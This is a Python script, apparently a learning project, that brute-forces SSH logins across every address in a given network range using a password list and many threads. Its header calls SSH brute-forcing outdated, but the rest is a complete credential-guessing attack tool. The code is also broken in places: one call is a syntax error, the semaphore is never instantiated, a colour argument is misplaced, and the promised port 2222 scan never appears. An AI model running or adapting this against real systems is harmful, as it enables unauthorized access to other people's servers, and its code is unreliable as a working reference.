# This tool scan a choosen network to search ssh servers on port 22
# and port 2222 (a classic). Then will try to brute them.
# It's a tool that i made for learning python purpose only.
# Nowadays bruteforcing SSH is does not make sense at all to me.
# We're not in '98 and password are not 'password' or '12345' but more complex.
# Also if you think that on entire internet will be a couple of misconfigured
# ssh server don't loose your time. Keep studying and coding.

import optparse
import time
import os
import threading
import ipaddress

from pexpect import pxssh
from termcolor import colored


maxConnections = 50000
connection_lock = threading.Semaphore
FOUND = False
FAILS = 0


def connect(host, user, password, release):
    """Function to connect to ssh server"""

    global FOUND
    global FAILS

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(colored('[+] Password FOUND: ' + password + " for user " + user + " on " + host), 'red')
        FOUND = True
    except Exception as e:
        # if socket is 'read_non- blocking' we assume that SSH server is maxed out at number of connections
        if 'read_nonblocking' in str(e):
            FAILS += 1
            # Sleep a little before trying again the same password
            time.sleep(5)
            connect(host, user, password, False)
        # if pxssh is having difficult obtaining command prompt, just sleep
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    """Main function of tool"""

    parser = optparse.OptionParser('./ssh-bastard.py -H <CIDR> -u <user> -F <passwordfile>')
    parser.add_option('-H', dest='cidr', type='string', help='specify a CIDR')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()
    cidr = options.cidr
    passwdFile = options.passwdFile
    user = options.user

    if cidr is None or passwdFile is None or user is None:
        print(parser.usage)
        exit(0)

    with open(passwdFile) as f:
        for line in f.readlines():
            if FOUND:
                # Exit from cycle if password is found
                print("[*] ONE PASSWORD FOUND! Exiting..")
                exit(0)
            if FAILS > 5:
                # Also exit from cycle if we have too many sockets timeouts
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)

            connection_lock.acquire(self=)
            password = line.strip('\r').strip('\n')

            # Reading CIDR
            for ip in ipaddress.IPv4Network(cidr):
                print("[-] Testing: " + str(password) + " for user " + user + " on host " + str(ip))
                t = threading.Thread(target=connect, args=(ip, user, password, True))
                t.start()


if __name__ == '__main__':
    os.system("clear")
    main()

